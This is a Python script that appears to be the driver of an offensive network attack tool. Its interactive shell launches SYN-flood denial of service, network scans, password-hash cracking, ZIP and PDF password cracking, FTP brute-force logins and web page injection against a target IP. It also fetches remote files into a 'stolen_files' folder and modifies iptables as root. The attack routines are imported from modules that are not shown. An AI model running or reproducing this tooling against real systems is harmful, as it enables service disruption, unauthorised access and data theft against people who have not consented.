#!/usr/bin/python3
from options import *
from isvalid import *
from denial_of_service import syn_flood
from password_file_cracker import *
from os import geteuid, popen, getcwd, mkdir
from os.path import exists, isfile
import subprocess
import sys


def parse_args(args, not_batch_mode=True):
    try:
        print(args)
        if args[0] == "GET":
            if len(args) == 3:
                if valid_ip(args[1]):
                    reply = get(args[1], args[2])
                    # reply = tcp_handshake(args[1], args[2])
                    with open("results.txt", "a+") as file:
                        if reply is None:
                            file.write("GET,FAILED," + args[1] + "," + args[2] + "\n")
                        else:
                            file.write("GET,PASSED," + args[1] + "," + args[2] + "\n")
                            if not exists(getcwd() + "/stolen_files"):
                                mkdir(getcwd()+"/stolen_files")
                            p = Path(args[2])
                            with open("./stolen_files/"+p.name, "w") as stolen:
                                stolen.write(reply)

                else:
                    print("Bad Input! Malformed IP Address!")
            else:
                print("Bad Input! Invalid Number of Arguments!")
                return

        elif args[0] == "scan":
            if len(args) == 2 and valid_ip(args[1]):
                network_scan(args[1])

        elif args[0] == "dos":
            print("ABOUT TO FLOOD")
            if len(args) == 3 and valid_ip(args[1]) and valid_port(args[2], True):
                syn_flood(args[1], args[2])
            else:
                print("usage: dos <Target IP> <Port Number>")

        elif args[0] == "crack-host":
            # By default attack andrew:
            with open("target.txt") as passFile:
                for line in passFile:
                    if ":" in line:
                        user = line.split(':')[0]
                        crypt_pass = line.split(':')[1].strip(' ')
                        print("[*] Cracking Password for user: " + user)
                        if len(args) == 1:
                            crack_local_host(crypt_pass)
                        elif len(args) == 2:
                            if exists(args[1]) and isfile(args[1]):
                                crack_local_host(crypt_pass, args[1])
                            else:
                                return
                        else:
                            return

        elif args[0] == "crack-zip":
            if len(args) == 1:
                print("usage: crack-zip <zip-file> <password-file>")
            elif len(args) == 2:
                if exists(args[1]) and isfile(args[1]):
                    crack_zip_file(args[1])
                else:
                    print("Zip file: " + args[1] + " not found!")
            elif len(args) == 3:
                if exists(args[1] and isfile(args[1]) and exists(args[2])) and isfile(args[2]):
                    crack_zip_file(args[1], args[2])
                else:
                    return
            else:
                return

        elif args[0] == "crack-pdf":
            if len(args) == 1:
                print("usage: crack-pdf <pdf-file> <password-file>")

            elif len(args) == 2:
                if exists(args[1]) and isfile(args[1]) and valid_extension(args[1], "pdf"):
                    crack_pdf_file(args[1])
                else:
                    print("PDF file: " + args[1] + " not found!")
            elif len(args) == 3:
                if exists(args[1] and isfile(args[1]) and exists(args[2])) and isfile(args[2]):
                    crack_pdf_file(args[1], args[2])
                else:
                    return
            else:
                return

        elif args[0] == "read" and not_batch_mode:
            if len(args) == 2:
                seconds = int(args[1])
                if seconds < 1:
                    print("Fuzzer does NOT support less than 1 second scans!")
                    return
                else:
                    pid_to_port()
                    read_ip(seconds)
            else:
                print("usage: read <time-frame in seconds>")

        elif args[0] == "ftp":
            if len(args) == 2 and valid_ip(args[1]):
                brute_login(args[1])
            elif len(args) == 3 and valid_ip(args[1]) and exists(args[2]) and isfile(args[2]):
                brute_login(args[1], args[2])
            else:
                print("usage: ftp <hostname> <username:password file>")

        elif args[0] == "inject":
            if len(args) == 2 and valid_ip(args[1]):
                inject_page(args[1])
            elif len(args) == 3 and valid_ip(args[1]):
                inject_page(args[1], args[2])
            elif len(args) == 4 and valid_ip(args[1]):
                inject_page(args[1], args[2], args[3])
            else:
                print("usage: inject <IP Address> <File to Inject> <Text to inject>")

    except KeyboardInterrupt:
        return

    except TimeoutError as t:
        print(t)
        return

    except ValueError:
        print("Invalid! Seconds can only be integer arguments!")
        return

    except Exception as e:
        print(e)
        return


def main():

    if geteuid() != 0:
        exit("Please try again, this time using 'sudo'. Exiting.")

    try:
        input("Beware! This program will assume you have nothing on your IP Tables! "
              "If you don't want this press CTRL-D NOW!\n")
    except EOFError:
        exit("Exiting Program early because permission denied to update IP Tables")

    # For TCP Handshake to work correctly, I need to modify IP Tables
    # sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <SOURCE IP> -j DROP
    source_ip = popen("hostname -I").read()
    update_table = ["sudo", "iptables", "-A", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-s", source_ip.rstrip(), "-j", "DROP"]
    subprocess.call(update_table)

    # An option supported by this is to read a text file and execute all commands as if it were fed on the shell
    if len(sys.argv) == 2 and exists(sys.argv[1]) and isfile(sys.argv[1]):
        # Remember that sys.argv[0] is fuzzer.py
        with open(sys.argv[1], "r") as file:
            for line in file:
                args = line.split()
                parse_args(args)

    while True:
        try:
            var = input("Shell> ")
            args = var.split()

            if len(args) == 1 and args[0] == "exit":
                break
            # This also takes case of when no arguments are inputted as well!
            else:
                parse_args(args)

        except EOFError:
            print("EOF detected --closing--")
            break

        except KeyboardInterrupt:
            print("Interrupt detected --closing--")
            break

        except Exception:
            print("Unknown Exception --closing--")
            break

    # Revert changes to IP Table!
    subprocess.call(["sudo", "iptables", "-F"])


if __name__ == '__main__':
    main()
